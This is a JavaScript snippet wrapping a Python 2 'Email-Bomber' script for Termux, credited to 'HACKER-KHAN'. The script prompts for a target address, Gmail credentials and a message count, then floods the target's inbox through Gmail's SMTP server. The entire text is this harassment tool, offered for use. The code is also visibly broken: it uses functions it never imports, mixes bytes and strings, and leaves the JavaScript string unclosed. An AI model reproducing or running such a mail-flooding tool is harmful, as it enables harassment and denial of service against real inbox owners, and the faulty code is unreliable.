var termux = document.createElement('div');
termux.innerHTML = '<pre>#!/data/data/com.termux/files/usr/bin/python3
import smtplib
from os import system
def main():
   print \'\033[1;32m=================================================\033[1;m\'
   print \'\033[1;32m[+]\033[1;m \033[1;77mEmail-Bomber by \033[1;m\033[1;31mHACKER-KHAN\033[1;m\'
   print \'\033[1;32m=================================================\033[1;m\'
   print \'\'
   print \'\033[1;32m[+]\033[1;m \033[1;77mTarget Email \033[1;m\033[1;31m: \033[1;m',
   to = raw_input()
   print \'\033[1;32m[+]\033[1;m \033[1;77mFake Email \033[1;m\033[1;31m: \033[1;m',
   gmail_user = raw_input()
   print \'\033[1;32m[+]\033[1;m \033[1;77mPassword \033[1;m\033[1;31m: \033[1;m',
   gmail_password = raw_input()
   print \'\033[1;32m[+]\033[1;m \033[1;77mNumber of Send \033[1;m\033[1;31m: \033[1;m',
   amount = input()
   print \'\'
   smtp_server = \'smtp.gmail.com\'
   port = 587
   setdefaulttimeout(1)
   server = smtplib.SMTP(smtp_server,port)
   server.ehlo()
   server.starttls()
   server.login(gmail_user,gmail_password)
   for i in range(1, amount+1):
       subject = os.urandom(9)
       msg = \'From: \' + gmail_user + \'\nSubject: \' + subject + \'\n\' + os.urandom(1)
       server.sendmail(gmail_user,to,msg)
       print \'\033[1;32m[\033[1;m\033[1;31m+\033[1;m\033[1;32m]\033[1;m \033[1;77mEmail sent\033[1;m\033[1;31m:\033[1;m\033[1;31m(\033[1;m\033[1;31m\' + str(i) + \'\033[1;m\033[1;31m)\033[1;m\'
   server.quit()
   print \'\033[1;32m[+]\033[1;m \033[1;77mTask Completed\033[1;m\'
   print \'\033[1;32m[+]\033[1;m \033[1;77mHave a good day :)\033[1;m\'
if __name__ == \'__main__\':
   main()
